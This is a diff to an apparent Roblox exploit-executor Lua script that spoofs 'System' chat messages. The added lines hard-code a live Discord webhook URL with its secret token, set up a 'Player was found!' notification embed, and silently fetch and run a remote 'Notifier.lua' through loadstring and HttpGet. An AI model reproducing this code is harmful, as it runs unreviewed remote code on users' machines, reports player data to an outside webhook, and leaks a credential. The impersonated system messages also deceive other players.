@@ -12,6 +12,42 @@ local messages = {
 local message = messages[math.random(1, #messages)]
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "System")
 
+getgenv().Main = {
+    Title = "Player was found!",
+    ThumbnailURL = "",
+    ColorEmbed = "#FFC0CB"  
+}
+
+getgenv().Field = {
+    Name = "information",
+    FieldValue = "1" 
+}
+
+getgenv().Footer = {
+    FooterURL = "",
+    FooterText = ""
+}
+
+getgenv().Authorization = {
+    Secret = "https://discord.com/api/webhooks/1284816073656369233/7DCpODRL3bfLcVWeGfZXb_1UE8OFpEvMGb5sue26jw6F55pmcQxysmZWRRHkQ1B5UehT",
+    Channel = ""
+}
+
+getgenv().field = true
+
+local CoreGui = game:GetService("CoreGui")
+local folderName = "b"
+
+if CoreGui:FindFirstChild(folderName) then        
+else
+    local folder = Instance.new("Folder")
+    folder.Name = folderName
+    folder.Parent = CoreGui  
+ 
+ spawn(function()        loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Not/main/Notifier.lua"))()
+    end)
+end
+
 setfpscap(144)
 
 
